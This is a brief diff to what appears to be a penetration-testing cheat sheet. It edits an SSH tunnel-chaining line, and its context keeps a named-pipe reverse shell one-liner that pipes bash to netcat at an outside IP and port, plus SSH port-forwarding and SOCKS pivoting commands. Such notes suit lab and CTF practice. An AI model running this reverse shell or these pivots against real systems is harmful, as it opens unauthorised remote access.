@@ -25,7 +25,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.14.85.242 9001 >/tmp/f
 ssh -L 7777:localhost:8888 user@192.168.0.100
 ssh -R 12340:localhost:9999 user@192.168.0.100
 ssh -C2qTnN -D 1080 user@target.host
-ssh -tt -L8080:localhost:8157 sean@10.11.1.251 ssh -t -D 8157 mario@10.1.1.1 -p 222
+ssh -tt -L8080:localhost:8157 solcoteh@10.10.10.10 ssh -t -D 8157 solcoteh@10.10.10.10 -p 222
 -oHostKeyAlgorithms=+ssh-rsa
 ```
 # File_Transfer ✅
